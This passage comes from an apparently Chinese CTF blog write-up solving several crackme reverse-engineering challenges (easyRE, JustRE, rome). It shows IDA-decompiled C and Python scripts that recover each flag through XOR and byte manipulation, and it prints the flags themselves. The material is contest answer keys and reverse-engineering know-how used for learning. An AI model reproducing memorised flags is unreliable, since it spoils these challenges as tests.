class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  __int64 s; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v0 = time(<span class="number">0LL</span>);</span><br><span class="line">  srand(v0);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( rand() % <span class="number">200</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;OK, it&#x27;s flag:&quot;</span>);</span><br><span class="line">        <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x28</span>uLL);</span><br><span class="line">        <span class="built_in">strcat</span>((<span class="type">char</span> *)&amp;s, f1);   <span class="comment">//f1=GXY&#123;do_not_</span></span><br><span class="line">        <span class="built_in">strcat</span>((<span class="type">char</span> *)&amp;s, &amp;f2);   <span class="comment">//f2=</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Solar not like you&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Solar want a girlfriend&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        s = <span class="number">0x7F666F6067756369</span>LL;</span><br><span class="line">        v5 = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">strcat</span>(&amp;f2, (<span class="type">const</span> <span class="type">char</span> *)&amp;s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">7</span>; ++j )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( j % <span class="number">2</span> == <span class="number">1</span> )</span><br><span class="line">            *(&amp;f2 + j) -= <span class="number">2</span>;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            --*(&amp;f2 + j);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;emmm,you can&#x27;t find flag 23333&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的switch需要正确排序才能获得正确的flag，这里很明显case1是最后一个，前两个猜测分别是case4和case5，就有下面的脚本</p><p><strong>逆向脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">flag1 = <span class="string">&#x27;GXY&#123;do_not_&#x27;</span></span><br><span class="line">flag2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">s = <span class="string">&#x27;7F666F6067756369&#x27;</span></span><br><span class="line">res1 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s), <span class="number">2</span>):</span><br><span class="line">    temp = <span class="string">&#x27;0x&#x27;</span> + s[i:i+<span class="number">2</span>]</span><br><span class="line">    res1.append(<span class="built_in">int</span>(temp, <span class="number">16</span>))</span><br><span class="line">res1 = res1[::-<span class="number">1</span>]   <span class="comment"># 这里似乎是因为大小端排序的问题似乎，然后上面的内容需要简单地逆一下</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(res1)):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        flag2 += <span class="built_in">chr</span>(res1[i]-<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag2 += <span class="built_in">chr</span>(res1[i]-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(flag1 + flag2)</span><br><span class="line"><span class="comment"># GXY&#123;do_not_hate_me&#125;</span></span><br></pre></td></tr></table></figure><h3 id="BJDCTF2020-JustRE"><a href="#BJDCTF2020-JustRE" class="headerlink" title="[BJDCTF2020]JustRE"></a>[BJDCTF2020]JustRE</h3><p><strong>查PE</strong></p><p><img src="/2021/05/28/CTF//image-20210530113755795.png" alt="PE信息"></p><p>emmm，直接拖入ida32看看吧</p><p><strong>得flag</strong></p><p>这种带有GUI的程序逆向主要就是先看字符串信息，直接查找字符串找到flag的一部分，再找到变换flag的关键函数</p><p><img src="/2021/05/28/CTF//image-20210530114039094.png" alt="image-20210530114039094"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">INT_PTR __stdcall <span class="title function_">DialogFunc</span><span class="params">(HWND hWnd, UINT a2, WPARAM a3, LPARAM a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  CHAR String[<span class="number">100</span>]; <span class="comment">// [esp+0h] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 != <span class="number">272</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 != <span class="number">273</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (_WORD)a3 != <span class="number">1</span> &amp;&amp; (_WORD)a3 != <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">sprintf</span>(String, Format, ++dword_4099F0);</span><br><span class="line">      <span class="keyword">if</span> ( dword_4099F0 == <span class="number">19999</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">sprintf</span>(String, <span class="string">&quot; BJD&#123;%d%d2069a45792d233ac&#125;&quot;</span>, <span class="number">19999</span>, <span class="number">0</span>);</span><br><span class="line">        SetWindowTextA(hWnd, String);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      SetWindowTextA(hWnd, String);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    EndDialog(hWnd, (<span class="type">unsigned</span> __int16)a3);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据下面的得到flag</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sprintf</span>(String, <span class="string">&quot; BJD&#123;%d%d2069a45792d233ac&#125;&quot;</span>, <span class="number">19999</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;1999902069a45792d233ac&#125;</span><br></pre></td></tr></table></figure><h3 id="2019红帽杯-easyRE"><a href="#2019红帽杯-easyRE" class="headerlink" title="[2019红帽杯]easyRE"></a>[2019红帽杯]easyRE</h3><p>提示了是elf文件，直接ida64打开之后一路跟踪到关键代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_4009C6</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-114h]</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+18h] [rbp-108h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+20h] [rbp-100h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+28h] [rbp-F8h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+30h] [rbp-F0h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+38h] [rbp-E8h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+40h] [rbp-E0h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+48h] [rbp-D8h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+50h] [rbp-D0h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+58h] [rbp-C8h]</span></span><br><span class="line">  <span class="type">char</span> v12[<span class="number">13</span>]; <span class="comment">// [rsp+60h] [rbp-C0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v13[<span class="number">4</span>]; <span class="comment">// [rsp+6Dh] [rbp-B3h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v14[<span class="number">19</span>]; <span class="comment">// [rsp+71h] [rbp-AFh] BYREF</span></span><br><span class="line">  <span class="type">char</span> v15[<span class="number">32</span>]; <span class="comment">// [rsp+90h] [rbp-90h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [rsp+B0h] [rbp-70h]</span></span><br><span class="line">  <span class="type">char</span> v17; <span class="comment">// [rsp+B4h] [rbp-6Ch]</span></span><br><span class="line">  <span class="type">char</span> v18[<span class="number">72</span>]; <span class="comment">// [rsp+C0h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v19; <span class="comment">// [rsp+108h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v19 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  qmemcpy(v12, <span class="string">&quot;Iodl&gt;Qnb(ocy&quot;</span>, <span class="number">12</span>);</span><br><span class="line">  v12[<span class="number">12</span>] = <span class="number">127</span>;</span><br><span class="line">  qmemcpy(v13, <span class="string">&quot;y.i&quot;</span>, <span class="number">3</span>);</span><br><span class="line">  v13[<span class="number">3</span>] = <span class="number">127</span>;</span><br><span class="line">  qmemcpy(v14, <span class="string">&quot;d`3w&#125;wek9&#123;iy=~yL@EC&quot;</span>, <span class="keyword">sizeof</span>(v14));</span><br><span class="line">  <span class="built_in">memset</span>(v15, <span class="number">0</span>, <span class="keyword">sizeof</span>(v15));</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  sub_4406E0(<span class="number">0LL</span>, v15, <span class="number">37LL</span>);</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( sub_424BA0(v15) == <span class="number">36</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; (<span class="type">unsigned</span> __int64)sub_424BA0(v15); ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)(v15[i] ^ i) != v12[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        result = <span class="number">4294967294LL</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sub_410CC0(<span class="string">&quot;continue!&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(v18, <span class="number">0</span>, <span class="number">0x40</span>uLL);</span><br><span class="line">    v18[<span class="number">64</span>] = <span class="number">0</span>;</span><br><span class="line">    sub_4406E0(<span class="number">0LL</span>, v18, <span class="number">64LL</span>);</span><br><span class="line">    v18[<span class="number">39</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( sub_424BA0(v18) == <span class="number">39</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = sub_400E44(v18);</span><br><span class="line">      v3 = sub_400E44(v2);</span><br><span class="line">      v4 = sub_400E44(v3);</span><br><span class="line">      v5 = sub_400E44(v4);</span><br><span class="line">      v6 = sub_400E44(v5);</span><br><span class="line">      v7 = sub_400E44(v6);</span><br><span class="line">      v8 = sub_400E44(v7);</span><br><span class="line">      v9 = sub_400E44(v8);</span><br><span class="line">      v10 = sub_400E44(v9);</span><br><span class="line">      v11 = sub_400E44(v10);</span><br><span class="line">      <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)sub_400360(v11, off_6CC090) )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_410CC0(<span class="string">&quot;You found me!!!&quot;</span>);</span><br><span class="line">        sub_410CC0(<span class="string">&quot;bye bye~&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      result = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = <span class="number">4294967293LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_13:</span><br><span class="line">  <span class="keyword">if</span> ( __readfsqword(<span class="number">0x28</span>u) != v19 )</span><br><span class="line">    sub_444020();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数似乎是个坑，本来我是不太会的，看了wp，原来是下面的这里的内容进行了10次base64解密会获得一个看雪某版主的一篇文章，而那篇文章对解这道题是无用的</p><p><img src="/2021/05/28/CTF//image-20210531125151809.png" alt="image-20210531125151809"></p><p>然后继续向下看，发现字符串<code>byte_6CC0A0</code>，点进去函数，发现这个才是真正的可以获得flag的函数</p><p><img src="/2021/05/28/CTF//image-20210531130338935.png" alt="image-20210531130338935"></p><p>发现该函数对应的反编译出的c语言的代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_400D35</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="string">&#x27;(&#x27;</span>);</span><br><span class="line">  v1 = sub_43FD20(<span class="number">0LL</span>) - qword_6CEE38;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1233</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_40F790(v1);</span><br><span class="line">    sub_40FE60();</span><br><span class="line">    sub_40FE60();</span><br><span class="line">    v1 = sub_40FE60() ^ <span class="number">0x98765432</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = v1;</span><br><span class="line">  <span class="keyword">if</span> ( ((<span class="type">unsigned</span> __int8)v1 ^ byte_6CC0A0[<span class="number">0</span>]) == <span class="string">&#x27;f&#x27;</span> &amp;&amp; (HIBYTE(v4) ^ (<span class="type">unsigned</span> __int8)byte_6CC0A3) == <span class="string">&#x27;g&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">24</span>; ++j )</span><br><span class="line">      sub_410E90((<span class="type">unsigned</span> __int8)(byte_6CC0A0[j] ^ *((_BYTE *)&amp;v4 + j % <span class="number">4</span>)));</span><br><span class="line">  &#125;</span><br><span class="line">  result = __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    sub_444020();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面这个异或实际上不起任何作用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1233</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_40F790(v1);</span><br><span class="line">    sub_40FE60();</span><br><span class="line">    sub_40FE60();</span><br><span class="line">    v1 = sub_40FE60() ^ <span class="number">0x98765432</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = v1;</span><br></pre></td></tr></table></figure><p>异或偶数次还是异或前的内容，所以只需要对于v4，只满足</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( ((<span class="type">unsigned</span> __int8)v1 ^ byte_6CC0A0[<span class="number">0</span>]) == <span class="string">&#x27;f&#x27;</span> &amp;&amp; (HIBYTE(v4) ^ (<span class="type">unsigned</span> __int8)byte_6CC0A3) == <span class="string">&#x27;g&#x27;</span> )</span><br></pre></td></tr></table></figure><p>与<code>6CC0A0</code>的前四位字符异或后等于<code>flag</code>即可，这里直接写脚本爆破v4与flag</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">l1 = <span class="string">&#x27;@5 V]&#x27;</span> + chr(<span class="number">0x18</span>) + <span class="string">&#x27;&quot;E&#x27;</span> + chr(<span class="number">0x17</span>) + <span class="string">&#x27;/$nb&lt;&#x27;</span> + chr(<span class="number">0x27</span>) + <span class="string">&#x27;THl$nr&lt;2E[&#x27;</span></span><br><span class="line">f1 = <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="string">f2 = &#x27;</span>&#x27;</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">4</span>):</span><br><span class="line">    key += chr(ord(f1[i]) ^ ord(l1[i]))</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">25</span>):</span><br><span class="line">    f2 += chr(ord(l1[i]) ^ ord(key[i % <span class="number">4</span>]))</span><br><span class="line">print(f2)</span><br><span class="line"><span class="meta"># flag&#123;Act1ve_Defen5e_Test&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ACTF新生赛2020-rome"><a href="#ACTF新生赛2020-rome" class="headerlink" title="[ACTF新生赛2020]rome"></a>[ACTF新生赛2020]rome</h3><p>查字符串找到主要函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v1[<span class="number">4</span>]; <span class="comment">// [esp+14h] [ebp-44h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v2; <span class="comment">// [esp+24h] [ebp-34h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v3; <span class="comment">// [esp+25h] [ebp-33h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v4; <span class="comment">// [esp+26h] [ebp-32h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v5; <span class="comment">// [esp+27h] [ebp-31h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v6; <span class="comment">// [esp+28h] [ebp-30h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+29h] [ebp-2Fh]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp+2Dh] [ebp-2Bh]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp+31h] [ebp-27h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+35h] [ebp-23h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v11; <span class="comment">// [esp+39h] [ebp-1Fh]</span></span><br><span class="line">  <span class="type">char</span> v12[<span class="number">29</span>]; <span class="comment">// [esp+3Bh] [ebp-1Dh] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(v12, <span class="string">&quot;Qsw3sj_lz4_Ujw@l&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;v2);</span><br><span class="line">  result = v2;</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = v3;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="string">&#x27;C&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = v4;</span><br><span class="line">      <span class="keyword">if</span> ( v4 == <span class="string">&#x27;T&#x27;</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = v5;</span><br><span class="line">        <span class="keyword">if</span> ( v5 == <span class="string">&#x27;F&#x27;</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          result = v6;</span><br><span class="line">          <span class="keyword">if</span> ( v6 == <span class="string">&#x27;&#123;&#x27;</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            result = v11;</span><br><span class="line">            <span class="keyword">if</span> ( v11 == <span class="string">&#x27;&#125;&#x27;</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              v1[<span class="number">0</span>] = v7;</span><br><span class="line">              v1[<span class="number">1</span>] = v8;</span><br><span class="line">              v1[<span class="number">2</span>] = v9;</span><br><span class="line">              v1[<span class="number">3</span>] = v10;</span><br><span class="line">              *(_DWORD *)&amp;v12[<span class="number">17</span>] = <span class="number">0</span>;</span><br><span class="line">              <span class="keyword">while</span> ( *(<span class="type">int</span> *)&amp;v12[<span class="number">17</span>] &lt;= <span class="number">15</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">if</span> ( *((<span class="type">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) &gt; <span class="number">64</span> &amp;&amp; *((<span class="type">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) &lt;= <span class="number">90</span> )</span><br><span class="line">                  *((_BYTE *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) = (*((<span class="type">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) - <span class="number">51</span>) % <span class="number">26</span> + <span class="number">65</span>;</span><br><span class="line">                <span class="keyword">if</span> ( *((<span class="type">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) &gt; <span class="number">96</span> &amp;&amp; *((<span class="type">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) &lt;= <span class="number">122</span> )</span><br><span class="line">                  *((_BYTE *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) = (*((<span class="type">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) - <span class="number">79</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">                